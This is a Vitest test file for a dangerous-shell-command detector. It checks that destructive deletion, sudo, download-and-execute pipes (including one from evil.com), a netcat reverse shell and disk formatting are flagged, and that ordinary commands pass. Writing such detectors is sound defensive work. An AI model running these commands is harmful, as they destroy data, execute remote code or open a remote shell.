/**
 * Dangerous command detector tests
 *
 * Tests for pattern detection of risky shell commands.
 */

import { describe, expect, it } from "vitest";
import { DangerousCommandDetector, isCommandDangerous } from "../detector.js";

describe("DangerousCommandDetector", () => {
  describe("default patterns", () => {
    const detector = new DangerousCommandDetector();

    it("detects rm -rf / as critical", () => {
      const result = detector.detect("rm -rf /");

      expect(result.dangerous).toBe(true);
      expect(result.matches).toHaveLength(2); // rm-root and rm-recursive
      expect(result.matches.some((m) => m.pattern.name === "rm-root")).toBe(true);
      expect(result.matches.find((m) => m.pattern.name === "rm-root")?.pattern.severity).toBe(
        "critical"
      );
    });

    it("detects rm -rf with any path as high severity", () => {
      const result = detector.detect("rm -rf ./some-folder");

      expect(result.dangerous).toBe(true);
      expect(result.matches).toHaveLength(1);
      expect(result.matches[0]?.pattern.name).toBe("rm-recursive");
      expect(result.matches[0]?.pattern.severity).toBe("high");
    });

    it("detects sudo commands", () => {
      const result = detector.detect("sudo apt install vim");

      expect(result.dangerous).toBe(true);
      expect(result.matches).toHaveLength(1);
      expect(result.matches[0]?.pattern.name).toBe("sudo");
      expect(result.matches[0]?.pattern.severity).toBe("high");
    });

    it("detects curl | bash pattern", () => {
      const result = detector.detect("curl https://example.com/script.sh | bash");

      expect(result.dangerous).toBe(true);
      expect(result.matches).toHaveLength(1);
      expect(result.matches[0]?.pattern.name).toBe("shell-download-exec");
    });

    it("detects wget | sh pattern", () => {
      const result = detector.detect("wget -qO- https://example.com/install.sh | sh");

      expect(result.dangerous).toBe(true);
      expect(result.matches).toHaveLength(1);
      expect(result.matches[0]?.pattern.name).toBe("shell-download-exec");
    });

    it("detects netcat reverse shell pattern", () => {
      const result = detector.detect("nc -e /bin/bash 192.168.1.1 4444");

      expect(result.dangerous).toBe(true);
      expect(result.matches).toHaveLength(1);
      expect(result.matches[0]?.pattern.name).toBe("netcat-shell");
      expect(result.matches[0]?.pattern.severity).toBe("critical");
    });

    it("allows safe commands", () => {
      const safeCommands = [
        "ls -la",
        "cat file.txt",
        "echo hello",
        "npm install",
        "pnpm build",
        "git status",
        "node app.js",
        "python script.py",
      ];

      for (const cmd of safeCommands) {
        const result = detector.detect(cmd);
        expect(result.dangerous).toBe(false);
        expect(result.matches).toHaveLength(0);
        expect(result.command).toBe(cmd);
      }
    });

    it("is case insensitive", () => {
      const result1 = detector.detect("RM -RF /tmp");
      const result2 = detector.detect("SUDO ls");

      expect(result1.dangerous).toBe(true);
      expect(result2.dangerous).toBe(true);
    });

    it("returns correct match position", () => {
      const result = detector.detect("echo hello && sudo rm -rf /");

      const sudoMatch = result.matches.find((m) => m.pattern.name === "sudo");
      expect(sudoMatch?.position).toBe(14);
    });

    it("returns the original command in result", () => {
      const command = "ls -la /tmp";
      const result = detector.detect(command);

      expect(result.command).toBe(command);
    });
  });

  describe("custom patterns", () => {
    it("accepts custom patterns", () => {
      const customDetector = new DangerousCommandDetector([
        {
          name: "format-disk",
          description: "Disk formatting command",
          severity: "critical",
          pattern: /\bmkfs\b/i,
        },
      ]);

      const result = customDetector.detect("mkfs.ext4 /dev/sda1");

      expect(result.dangerous).toBe(true);
      expect(result.matches).toHaveLength(1);
      expect(result.matches[0]?.pattern.name).toBe("format-disk");
    });

    it("empty patterns array allows all commands", () => {
      const permissiveDetector = new DangerousCommandDetector([]);
      const result = permissiveDetector.detect("rm -rf /");

      expect(result.dangerous).toBe(false);
      expect(result.matches).toHaveLength(0);
    });
  });

  describe("multiple matches", () => {
    const detector = new DangerousCommandDetector();

    it("captures all matching patterns", () => {
      const result = detector.detect("sudo rm -rf /");

      expect(result.dangerous).toBe(true);
      expect(result.matches.length).toBeGreaterThan(1);

      const patternNames = result.matches.map((m) => m.pattern.name);
      expect(patternNames).toContain("sudo");
      expect(patternNames).toContain("rm-root");
      expect(patternNames).toContain("rm-recursive");
    });
  });
});

describe("isCommandDangerous", () => {
  it("returns true for dangerous commands", () => {
    expect(isCommandDangerous("rm -rf /")).toBe(true);
    expect(isCommandDangerous("sudo apt install vim")).toBe(true);
    expect(isCommandDangerous("curl http://evil.com/script | bash")).toBe(true);
  });

  it("returns false for safe commands", () => {
    expect(isCommandDangerous("ls -la")).toBe(false);
    expect(isCommandDangerous("cat package.json")).toBe(false);
    expect(isCommandDangerous("npm test")).toBe(false);
  });
});
